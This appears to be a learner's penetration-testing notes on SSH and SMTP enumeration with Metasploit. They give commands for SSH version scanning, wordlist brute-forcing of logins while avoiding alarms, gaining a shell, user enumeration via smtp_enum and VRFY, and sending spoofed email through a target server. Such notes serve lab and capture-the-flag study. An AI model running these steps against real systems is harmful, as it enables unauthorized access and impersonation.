SSH (Secure Shell) is a remote administration protocol that offers encryption and is the successor to Telnet. It is typically used for remote access to servers and systems. If you wanted a GUI you’d normally use RDP or VNC

- SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port. This is very common with companies but can be identified with a port scan
- We can utilize auxiliary modules to enumerate the version of SSH running on the target as well as perform brute-force attacks to identify passwords that can consequently provide us remote access to a target. The version is very important when vulnerability scanning

### Check for SSH Version

To determine the SSH version, use the `ssh_version` auxiliary module. You can search for SSH auxiliary modules using `search type:auxiliary name:ssh` or access it directly at `auxiliary/scanner/ssh/ssh_version`.

Running this scan will return the SSH version as well as details about the underlying operating system. 

```
use auxiliary/scanner/ssh/ssh_version
set RHOSTS [target]
run
```

### Brute Force SSH Login

For brute forcing SSH logins, use the `ssh_login` auxiliary module. Locate it by searching with `search ssh_login` or use `auxiliary/scanner/ssh/ssh_login`.

Configure the module to adjust settings such as `BRUTEFORCE_SPEED` to avoid tripping security alarms. SSH login attempts are typically logged, so use caution. Enable `STOP_ON_SUCCESS` to stop once a valid login is found, and set `VERBOSE` to `false` to reduce output clutter. Can use Metasploit's built-in wordlists for common usernames and passwords:

- `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
- `/usr/share/metasploit-framework/data/wordlists/common_passwords.txt`
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS [target]
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set VERBOSE false
set STOP_ON_SUCCESS true
run
```

When a valid credential is found, an SSH session is created. Use `sessions -i <id>` to interact with the session. For a full interactive shell, run `/bin/bash -i` once connected. The -i is necessary so you can see the outputs from some of the commands executing
```
sessions -i [session_id]
/bin/bash -i
```

#### Searching Files on the System

To search for specific files throughout the entire file system, use the `find` command. This is especially useful when you're hunting for files like "flags" during a capture-the-flag exercise or other sensitive data.

```
find / -name "[filename]"
```

Once you locate the file, use the `cat` command to view its contents:

```
cat /[path_to_file]
```
### Enumerate Users to Narrow Down Brute Force (Might Not Work)

For user enumeration, try the `ssh_enumusers` module. Note that this method may only work on certain versions of OpenSSH and could be patched. Search for it with `search ssh_enumusers` or access it directly at `auxiliary/scanner/ssh/ssh_enumusers`.

Configure the scan to use a common users wordlist:

- `/usr/share/metasploit-framework/data/wordlists/common_users.txt`

```
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS [target]
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
```

*Note: This scan didnt work for me since this it looks like the malformed packet technique with the enumerate module only works on some OpenSSH servers and looked to have been patched I currently get the below result when running the scan
If the scan fails, refer to issues like for more context [https://github.com/rapid7/metasploit-framework/issues/15676](https://github.com/rapid7/metasploit-framework/issues/15676)*


---
## SMTP-Enumeration

SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used for the transmission of email. SMTP uses TCP port 25 by default. It is can also be configured to run on TCP port 465 and 587 if SSL is setup. We can utilize auxiliary modules to enumerate the version of SMTP as well as user accounts on the target system. Version is important when looking at vulnerabilities but looking at SMTP normally doesn’t provide much unless you’re exploiting the exact version of the SMTP service that’s running on the target but the information from SMTP could be used to gather other information on the target.

### Getting SMTP Service Version

To identify the SMTP service version, use the `smtp_version` auxiliary module. You can find this by searching for SMTP auxiliary modules with `search type:auxiliary name:smtp` or directly using `auxiliary/scanner/smtp/smtp_version`.

Before running the scan, it’s a good idea to confirm that SMTP is running on the target port with a port scan. The default settings should work well, as the module retrieves the banner, to get  the SMTP version. This can provide critical information about the server, such as whether it’s running a specific software like Postfix.

```
use auxiliary/scanner/smtp/smtp_version
set RHOSTS [target]
run
```

### Enumerate Users with SMTP

To gather valid user accounts on an SMTP server, you have two main options: using Metasploit’s `smtp_enum` module or the standalone `smtp-user-enum` tool. Both methods can help narrow down potential targets for further attacks, like SSH brute forcing, by providing a list of valid usernames.

- **Option 1: smtp_enum Module** : This method uses Metasploit's built-in module for enumerating SMTP users. You can search for it with `search type:auxiliary name:smtp` or go straight to `auxiliary/scanner/smtp/smtp_enum`. The default settings will work, though the scan may take a few minutes depending on the server's response time.

```
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS [target]
run
```

- **Option 2: Using the smtp-user-enum Tool**  : The `smtp-user-enum` tool is another  way to enumerate users on an SMTP server. It uses a specified wordlist to check for common usernames.

```
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t [target]
```

### Identify the SMTP Server and Banner

To discover the SMTP service name and banner, use an Nmap scan to grab service details. This will reveal the server type and welcome message, providing essential information for further analysis.

```
nmap -sV --script banner [target]
```


### Connect to the SMTP Service Using Netcat

You can use Netcat to manually connect to the SMTP service and retrieve the hostname or domain name of the server.  This get shows the service's response and configuration.

```
nc [target] 25
```

### Verify if a User Exists Manually

Use the `VRFY` command to check if a specific user, like "admin," exists on the server. This can confirm the presence of accounts for later brute-force attempts. Will respond `Yes` or `No`. This can be repeated for other usernames
```
VRFY user@[server_domain]
```

Example:
```
VRFY admin@arandosite.xyz
```

### Discover Supported SMTP Commands Using Telnet

Connect to the SMTP service with Telnet and use `HELO` and `EHLO` to list supported commands. This is crucial for understanding what operations the SMTP server allows.

```
telnet [target] 25
HELO [your_domain]
EHLO [your_domain]
```


### Send a Fake Email to Test SMTP

There are two main ways to send a test email to the SMTP server: using Telnet for a more hands-on approach or the `sendemail` command for a streamlined, automated option.

- **Option 1: Using Telnet**  - This method lets you manually connect to the SMTP server and send an email step by step. Make sure to end your message with a `.` on a new line to indicate you're done.
```
telnet [target] 25
HELO [your_domain]
mail from: admin@[your_domain]
rcpt to: root@[server_domain]
data
Subject: Hi Root
Hello,
This is a fake email sent using the Telnet command.
From,
Admin
.
```

- **Option 2: Using sendemail Command**  - For a more automated process, use the `sendemail` command. It’s quick, efficient, and useful for scripting.

```
sendemail -f admin@[your_domain] -t root@[server_domain] -s [target] -u Fakemail -m "Hi root, a fake from admin" -o tls=no
```

- `-f admin@[your_domain]`: Specifies the "from" email address.
- `-t root@[server_domain]`: Specifies the "to" email address.
- `-s [target]`: The SMTP server you are using to send the email.
- `-u Fakemail`: The subject of the email.
- `-m "Hi root, a fake from admin"`: The body of the email.
- `-o tls=no`: Disables TLS encryption, as some servers may not support it.